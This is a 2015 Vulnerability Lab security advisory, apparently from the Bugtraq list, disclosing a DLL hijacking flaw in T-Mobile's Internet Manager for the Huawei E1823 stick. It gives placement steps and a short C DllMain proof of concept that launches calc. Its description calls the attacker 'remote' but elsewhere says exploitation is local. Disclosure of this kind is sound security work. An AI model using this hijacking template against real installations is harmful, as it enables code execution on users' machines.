
Date: Wed, 11 Feb 2015 16:22:35 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: T-Mobile Internet Manager - DLL Hijacking (mfc71enu.dll)

Document Title:
===============
T-Mobile Internet Manager - DLL Hijacking (mfc71enu.dll)


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1427


Release Date:
=============
2015-01-29


Vulnerability Laboratory ID (VL-ID):
====================================
1427


Common Vulnerability Scoring System:
====================================
5.6


Product & Service Introduction:
===============================
Lange Zeit war der sehr beliebte HSPA+ Surfstick Huawei E1823 alias Web`n`Walk Stick Business nur für Geschäftskunden 
verfügbar – zumindest wenn man ihn direkt über die Telekom bestellen wollte. Mit der heutigen Ankündigung, dass UMTS 
Netz ab sofort auf 21,6Mbit/s aufgerüstet zu haben, musste natürlich auch  eine Bezugsmöglichkeit für Privatkunden her. 
So gibt es den bis zu 28,8Mbit/s schnellen Stick nun direkt bei der Telekom für 69,95€ ohne Vertrag bzw. für 4,95€ mit 
einem Datenvertrag. Der Stick hat keinen Simlock, kann also mit jeder Karte und in jedem Netz verwendet werden. 
Die Telekom preist auf der Produktseite des Sticks auch die Möglichkeit der weltweiten Nutzung an, die durch die 
vielen unterstützen Funkfrequenzen möglich wird.

(Copy of the Vendor Homepage: http://maxwireless.de/2011/webnwalk-stick-business-huawei-e1823-ab-sofort-bestellbar/ )


Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered a dll hijacking vulnerability in the T-Mobile Web’n’Walk Stick Business (Huawei E1823) Internet Manager v11.301.05.65.55 software.


Vulnerability Disclosure Timeline:
==================================
2015-01-29:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
T-Mobile
Product: Web`n`Walk Stick Business E1823 (USB) - Software 11.301.05.65.55


Exploitation Technique:
=======================
Local


Severity Level:
===============
Medium


Technical Details & Description:
================================
T-mobiles Web`n`Walk Stick software could allow a remote attacker to execute arbitrary code on the system. The software does 
not specify the fully qualified path to a dynamic-linked library (mfc71enu.dll). The windows software is vulnerable to dll hijacking 
attacks. The vulnerable version affects Microsoft Windows (wininstaller_11.301.05.65.55.zip).

HUAWEI Mobile Broadband
HSPA+ USB Sidebar
Model HUAWEI E1823 


Proof of Concept (PoC):
=======================
The dll hijacking vulnerability can be exploited by local attackers with low privileged system user account and without user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the vulnerability ...
1. Compile dll and rename to mfc71enu.dll or mfc71loc.dll
2. Copy mfc71enu.dll to C:\Program Files\T-Mobile\InternetManager_H
3. Launch T-Mobile Internet Manager
4. Successful reproduce of the local dll hijacking vulnerability!


PoC: Exploit
*/

#include <windows.h>
 
int alpdaemon()
{
  WinExec("calc", SW_SHOW);
  exit(0);
  return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  alpdaemon();
  return 0;
}


PoC: Video
http://youtu.be/Go0iHJON7u4

Reference(s):
http://maxwireless.de/2011/webnwalk-stick-business-huawei-e1823-ab-sofort-bestellbar/
https://www.t-mobile.de/downloads/neu/wininstaller_11.301.05.65.55.zip


Security Risk:
==============
The security risk of the local dll hijacking vulnerability in the mfc71enu.dll is estimated as medium. (CVSS 5.6)


Credits & Authors:
==================
metacom


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt


